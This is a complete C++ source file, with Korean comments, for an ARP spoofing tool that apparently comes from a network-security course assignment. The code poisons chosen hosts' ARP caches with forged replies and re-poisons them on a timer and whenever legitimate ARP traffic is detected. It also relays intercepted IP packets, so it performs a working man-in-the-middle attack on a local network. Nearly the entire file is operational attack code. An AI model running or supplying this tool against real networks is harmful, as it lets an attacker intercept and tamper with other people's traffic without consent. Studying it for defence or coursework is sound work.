#include <cstdio>
#include <pcap.h>
#include <vector>
#include <utility>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <thread>
#include <csignal>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof enp6s0 192.168.200.163 192.168.200.254 192.168.200.254 192.168.200.163\n");
}

struct Flow {
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
	Mac targetMac;
};

struct Param {
	char* dev_; // 인터페이스 이름
	std::vector<std::pair<Ip, Ip>> pairs_; // (sender IP, target IP) 쌍 목록 
};

Param param;
pcap_t* g_pcap = nullptr;
Mac g_attackerMac;
std::vector<Flow>* g_flows = nullptr;

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	for (int i = 2; i + 1 < argc; i += 2) {
		param->pairs_.push_back({Ip(argv[i]), Ip(argv[i + 1])});
	}
	return true;
}

// https://www.binarytides.com/c-program-to-get-mac-address-from-interface-name-on-linux/
Mac getMyMac(const char* dev) {
	int fd;
	struct ifreq ifr;
	unsigned char *mac;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

	return Mac(mac);
}

Ip getMyIp(const char* dev) {
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
	return Ip(ntohl(sin->sin_addr.s_addr));
}

Mac getMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
	EthArpPacket packet;

	// arp request 브로드캐스트 하기
	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(senderIp);

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
		return Mac::nullMac(); // 실패 시 nullMac 반환
	}

	// arp reply 기다리기
	while (true) {
		struct pcap_pkthdr* response_header;
		const u_char* response_pkt;
		int ret = pcap_next_ex(pcap, &response_header, &response_pkt);
		if (ret == 0) continue;
		if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
			return Mac::nullMac(); // 실패 시 nullMac 반환
		}

		EthHdr* ethHdr = (EthHdr*)response_pkt;
		if (ethHdr->type() != EthHdr::Arp) continue;

		ArpHdr* arpHdr = (ArpHdr*)(response_pkt + sizeof(EthHdr));
		if (arpHdr->op() != ArpHdr::Reply) continue;
		if (arpHdr->sip() != senderIp) continue;

		return arpHdr->smac();
	}
}


void infect(pcap_t* pcap, Mac attackerMac, const Flow& flow) {
	EthArpPacket packet;

	packet.eth_.dmac_ = flow.senderMac;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(flow.targetIp);
	packet.arp_.tmac_ = flow.senderMac;
	packet.arp_.tip_ = htonl(flow.senderIp);

	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

// 종료 시 정상 ARP 정보를 sender에게 전송하여 감염 해제
// ARP request로
void recover(pcap_t* pcap, Mac attackerMac, const Flow& flow) {
	EthArpPacket packet;

	packet.eth_.dmac_ = flow.senderMac;
	packet.eth_.smac_ = attackerMac; // eth 필드의 smac은 공격자 MAC 주소로
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = flow.targetMac; // ARP 필드에는 Target의 실제 MAC
	packet.arp_.sip_ = htonl(flow.targetIp);
	packet.arp_.tmac_ = flow.senderMac;
	packet.arp_.tip_ = htonl(flow.senderIp);

	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

void sigintHandler(int signum) {
	if (g_pcap && g_flows) {
		printf("\n[DEBUG] recovering ARP tables...\n");
		for (const Flow& flow : *g_flows)
			recover(g_pcap, g_attackerMac, flow);
	}
	exit(0);
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return EXIT_FAILURE;

	char* dev = param.dev_;
	char errbuf[PCAP_ERRBUF_SIZE];
	// jumbo frame 대응을 위해 snaplen을 IP 패킷 최대 크기로 설정
	// https://datatracker.ietf.org/doc/html/rfc791#section-3.1 - Total Length: 16 bits (max 65535)
	pcap_t* pcap = pcap_open_live(dev, 65535, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	// 1. Attacker MAC 주소 휙득
	Mac attackerMac = getMyMac(dev);
	// 2. Attacker IP 주소 휙득
	Ip attackerIp = getMyIp(dev);

	printf("Attacker MAC: %s\n", std::string(attackerMac).c_str());
	printf("Attacker IP: %s\n", std::string(attackerIp).c_str());

	std::vector<Flow> flows;

	// SIGINT 핸들러 등록
	g_pcap = pcap;
	g_attackerMac = attackerMac;
	g_flows = &flows;
	signal(SIGINT, sigintHandler);

	for (int i = 0; i < param.pairs_.size(); i++) {
		Ip senderIp = param.pairs_[i].first;
		Ip targetIp = param.pairs_[i].second;

		// 3. Sender MAC 주소 획득
		Mac senderMac = getMac(pcap, attackerMac, attackerIp, senderIp);
		printf("Sender MAC: %s\n", std::string(senderMac).c_str());

		// 4. Target MAC 주소 획득
		Mac targetMac = getMac(pcap, attackerMac, attackerIp, targetIp);
		printf("Target MAC: %s\n", std::string(targetMac).c_str());

		flows.push_back({senderIp, senderMac, targetIp, targetMac});
		infect(pcap, attackerMac, flows.back());
	}

	// 6. 주기적 infect 스레드 (10초마다)
	std::thread infectThread([&]() {
		while (true) {
			sleep(10);
			for (const Flow& flow : flows)
				infect(pcap, attackerMac, flow);
			printf("[DEBUG] periodic re-infect\n");
		}
	});
	infectThread.detach();

	// 7. 패킷 캡처 루프
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* pkt;
		int ret = pcap_next_ex(pcap, &header, &pkt);
		if (ret == 0) continue;
		if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
			break;
		}

		EthHdr* ethHdr = (EthHdr*)pkt;

		// ARP 패킷 감시: recover 감지
		if (ethHdr->type() == EthHdr::Arp) {
			ArpHdr* arpHdr = (ArpHdr*)(pkt + sizeof(EthHdr));
			for (const Flow& flow : flows) {
				bool fromTarget = (arpHdr->sip() == flow.targetIp && arpHdr->tip() == flow.senderIp); // Target이 Sender에게 보내는 ARP 패킷
				bool fromSender = (arpHdr->sip() == flow.senderIp && arpHdr->tip() == flow.targetIp); // Sender가 브로드캐스트로 Target을 찾는 ARP Request
				if (fromTarget || fromSender) {
					printf("[DEBUG] %s > recover detected, re-infecting\n", std::string(flow.senderIp).c_str());
					// 라우터의 정상 ARP Reply보다 늦게 도착할 수 있도록 여러 번 전송
					for (int j = 0; j < 3; j++)
						infect(pcap, attackerMac, flow);
					break;
				}
			}
			continue;
		}

		if (ethHdr->type() != EthHdr::Ip4) continue;
		if (ethHdr->dmac() != attackerMac) continue;

		for (const Flow& flow : flows) {
			if (ethHdr->smac() != flow.senderMac) continue;

			// Ethernet 헤더만 변경하여 재전송
			std::vector<uint8_t> relayPkt(pkt, pkt + header->caplen); // VLA 대신 std::vector 사용

			EthHdr* relayEth = (EthHdr*)relayPkt.data();
			relayEth->smac_ = attackerMac; // smac은 공격자 MAC 주소
			relayEth->dmac_ = flow.targetMac; // dmac은 라우터 MAC 주소

			pcap_sendpacket(pcap, relayPkt.data(), header->caplen);
			// printf("%s > relay %d bytes\n", std::string(flow.senderIp).c_str(), header->caplen);
			break;
		}
	}

	pcap_close(pcap);
}
